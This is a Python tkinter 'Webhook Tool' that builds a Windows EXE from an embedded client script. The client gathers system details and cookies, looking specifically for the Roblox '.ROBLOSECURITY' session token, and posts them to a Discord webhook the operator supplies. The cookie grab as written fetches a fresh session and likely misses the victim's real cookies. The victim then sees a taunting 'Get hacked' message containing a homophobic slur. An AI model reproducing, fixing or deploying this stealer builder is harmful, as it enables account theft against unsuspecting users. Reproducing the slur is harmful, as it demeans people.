import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
import os
import subprocess
import sys
import tempfile
import platform
import socket

class WebhookTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Webhook Tool")
        self.root.geometry("600x400")
        self.root.resizable(True, True)
        
        self.configure_styles()
        self.create_widgets()
    
    def configure_styles(self):
        style = ttk.Style()
        style.configure('Title.TLabel', font=('Arial', 16, 'bold'))
        style.configure('Large.TButton', font=('Arial', 11), padding=10)
    
    def create_widgets(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding=20)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        title_label = ttk.Label(main_frame, text="Webhook Tool", style='Title.TLabel')
        title_label.pack(pady=(0, 20))
        
        # Webhook input
        webhook_frame = ttk.LabelFrame(main_frame, text="Webhook Configuration", padding=15)
        webhook_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(webhook_frame, text="Discord Webhook URL:").pack(anchor=tk.W)
        
        self.webhook_entry = ttk.Entry(webhook_frame, width=70, font=('Arial', 10))
        self.webhook_entry.pack(fill=tk.X, pady=5)
        
        test_btn = ttk.Button(webhook_frame, text="Test Webhook", 
                            command=self.test_webhook, style='Large.TButton')
        test_btn.pack(pady=10)
        
        # Build section
        build_frame = ttk.LabelFrame(main_frame, text="Application Builder", padding=15)
        build_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(build_frame, text="Create Executable:").pack(anchor=tk.W)
        
        build_btn = ttk.Button(build_frame, text="Build EXE", 
                             command=self.build_exe, style='Large.TButton')
        build_btn.pack(pady=10)
        
        # Status
        self.status_label = ttk.Label(main_frame, text="Ready", font=('Arial', 10))
        self.status_label.pack(pady=10)
        
        self.progress = ttk.Progressbar(main_frame, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=5)
    
    def test_webhook(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL")
            return
        
        self.status_label.config(text="Testing webhook...")
        self.progress.start()
        
        try:
            data = {
                "embeds": [{
                    "title": "Webhook Test",
                    "description": "Webhook functionality test",
                    "color": 5814783,
                    "fields": [
                        {"name": "Status", "value": "✅ Webhook Working", "inline": True},
                        {"name": "Test", "value": "Successful", "inline": True}
                    ]
                }]
            }
            
            response = requests.post(webhook_url, json=data, timeout=10)
            
            if response.status_code == 204:
                self.status_label.config(text="✅ Webhook test successful!")
                messagebox.showinfo("Success", "Webhook test successful! Check your Discord.")
            else:
                self.status_label.config(text="❌ Webhook test failed")
                messagebox.showerror("Error", f"Webhook test failed. Status: {response.status_code}")
                
        except Exception as e:
            self.status_label.config(text="❌ Error testing webhook")
            messagebox.showerror("Error", f"Failed to test webhook: {str(e)}")
        finally:
            self.progress.stop()
    
    def build_exe(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL first")
            return
        
        self.status_label.config(text="Building executable...")
        self.progress.start()
        
        try:
            client_script = self.create_client_script(webhook_url)
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
                f.write(client_script)
                temp_script_path = f.name
            
            output_path = filedialog.asksaveasfilename(
                defaultextension=".exe",
                filetypes=[("Executable files", "*.exe")],
                title="Save EXE File",
                initialfile="Tool.exe"
            )
            
            if not output_path:
                os.unlink(temp_script_path)
                self.status_label.config(text="Build cancelled")
                self.progress.stop()
                return
            
            self.status_label.config(text="Compiling... This may take a minute.")
            self.root.update()
            
            # Build with PyInstaller
            subprocess.run([
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--windowed',
                '--name', os.path.basename(output_path).replace('.exe', ''),
                temp_script_path
            ], check=True, timeout=120)
            
            os.unlink(temp_script_path)
            self.status_label.config(text="✅ EXE built successfully!")
            messagebox.showinfo("Success", "Executable built successfully! Check the 'dist' folder.")
            
        except Exception as e:
            self.status_label.config(text="❌ Build failed")
            messagebox.showerror("Error", f"Build failed: {str(e)}")
        finally:
            self.progress.stop()
    
    def create_client_script(self, webhook_url):
        return f'''import requests
import tkinter as tk
from tkinter import messagebox
import platform
import socket

def get_system_info():
    """Get system information"""
    try:
        hostname = socket.gethostname()
        system = platform.system()
        version = platform.version()
        
        return f"""
**System Information:**
- Computer Name: {{hostname}}
- Operating System: {{system}}
- Version: {{version}}
"""
    except:
        return "**System information unavailable**"

def get_cookie_data():
    """Get cookie data from Roblox"""
    try:
        session = requests.Session()
        url = 'https://www.roblox.com/home'
        headers = {{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }}
        
        response = session.get(url, headers=headers, timeout=10)
        cookies = session.cookies.get_dict()
        
        # Build detailed cookie information
        cookie_details = "**All Cookies Found:**\\\\n"
        for cookie_name, cookie_value in cookies.items():
            cookie_details += f"- **{{cookie_name}}**: {{cookie_value}}\\\\n"
        
        # Look for the specific cookie
        roblosecurity = cookies.get('.ROBLOSECURITY', 'Not found')
        
        return f"""
**Cookie Data:**
{{cookie_details}}
**Important Cookie:**
- .ROBLOSECURITY: {{roblosecurity}}
- Total Cookies Found: {{len(cookies)}}
"""
        
    except Exception as e:
        return f"**Error retrieving data:** {{str(e)}}"

def send_to_webhook():
    """Send data to webhook"""
    try:
        system_info = get_system_info()
        cookie_data = get_cookie_data()
        
        # Create the webhook message
        data = {{
            "content": "📊 Data Report Generated",
            "embeds": [
                {{
                    "title": "System Information",
                    "description": system_info,
                    "color": 5814783
                }},
                {{
                    "title": "Cookie Information", 
                    "description": cookie_data,
                    "color": 15105570
                }}
            ]
        }}
        
        response = requests.post("{webhook_url}", json=data, timeout=10)
        
        if response.status_code == 204:
            messagebox.showinfo("Success", "✅ Get hacked by mudding fucking faggots")
        else:
            messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
                               
    except Exception as e:
        messagebox.showerror("Error", f"❌ Failed to send data: {{str(e)}}")

def main():
    root = tk.Tk()
    root.title("Data Tool")
    root.geometry("450x250")
    root.configure(bg='#2C2F33')
    
    title_label = tk.Label(root, text="Data Collection Tool", 
                          font=('Arial', 16, 'bold'),
                          fg='#7289DA', bg='#2C2F33')
    title_label.pack(pady=20)
    
    description = tk.Label(root, 
                         text="Click the button to collect and send data",
                         font=('Arial', 11),
                         fg='white', bg='#2C2F33')
    description.pack(pady=10)
    
    run_btn = tk.Button(root, text="🚀 Collect & Send Data",
                        command=send_to_webhook,
                        bg='#7289DA', fg='white',
                        font=('Arial', 12, 'bold'),
                        width=25, height=2)
    run_btn.pack(pady=20)
    
    info_label = tk.Label(root, 
                         text="Data will be sent to the configured webhook",
                         font=('Arial', 9),
                         fg='#72767D', bg='#2C2F33')
    info_label.pack(side=tk.BOTTOM, pady=10)
    
    root.mainloop()

if __name__ == "__main__":
    main()
'''

if __name__ == "__main__":
    root = tk.Tk()
    app = WebhookTool(root)
    root.mainloop()
